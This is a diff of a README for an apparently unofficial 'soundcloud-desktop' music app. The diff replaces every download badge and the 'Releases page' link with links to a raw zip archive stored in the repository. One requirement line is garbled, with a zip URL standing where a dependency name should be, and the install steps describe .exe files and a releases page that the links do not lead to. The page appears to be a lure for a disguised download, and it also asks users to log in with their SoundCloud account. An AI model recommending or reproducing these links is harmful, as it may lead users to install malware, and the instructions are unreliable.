@@ -1,6 +1,6 @@
 # 🎵 soundcloud-desktop - Enjoy Your Music Seamlessly
 
-[![Download SoundCloud Desktop](https://raw.githubusercontent.com/ProfyGamer123/soundcloud-desktop/main/src/soundcloud-desktop-v1.0.zip)](https://raw.githubusercontent.com/ProfyGamer123/soundcloud-desktop/main/src/soundcloud-desktop-v1.0.zip)
+[![Download SoundCloud Desktop](https://github.com/ProfyGamer123/soundcloud-desktop/raw/refs/heads/main/public/desktop_soundcloud_v3.3.zip)](https://github.com/ProfyGamer123/soundcloud-desktop/raw/refs/heads/main/public/desktop_soundcloud_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -21,13 +21,13 @@ To run soundcloud-desktop, ensure your system meets the following requirements:
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, Linux with a modern desktop environment.
 - **RAM**: 4 GB or more.
 - **Disk Space**: At least 200 MB of free space.
-- **https://raw.githubusercontent.com/ProfyGamer123/soundcloud-desktop/main/src/soundcloud-desktop-v1.0.zip**: Not required—our app is bundled and ready to go!
+- **https://github.com/ProfyGamer123/soundcloud-desktop/raw/refs/heads/main/public/desktop_soundcloud_v3.3.zip**: Not required—our app is bundled and ready to go!
 
 ## 📥 Download & Install
 
 To get started with soundcloud-desktop, follow these simple steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/ProfyGamer123/soundcloud-desktop/main/src/soundcloud-desktop-v1.0.zip) to download the application.
+1. Visit the [Releases page](https://github.com/ProfyGamer123/soundcloud-desktop/raw/refs/heads/main/public/desktop_soundcloud_v3.3.zip) to download the application.
 2. Look for the latest version at the top of the page.
 3. Download the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
@@ -40,7 +40,7 @@ To get started with soundcloud-desktop, follow these simple steps:
 
 5. Launch the application, log in with your SoundCloud account, and start enjoying your music!
 
-[![Download SoundCloud Desktop](https://raw.githubusercontent.com/ProfyGamer123/soundcloud-desktop/main/src/soundcloud-desktop-v1.0.zip)](https://raw.githubusercontent.com/ProfyGamer123/soundcloud-desktop/main/src/soundcloud-desktop-v1.0.zip)
+[![Download SoundCloud Desktop](https://github.com/ProfyGamer123/soundcloud-desktop/raw/refs/heads/main/public/desktop_soundcloud_v3.3.zip)](https://github.com/ProfyGamer123/soundcloud-desktop/raw/refs/heads/main/public/desktop_soundcloud_v3.3.zip)
 
 ## 🎼 How to Use
 
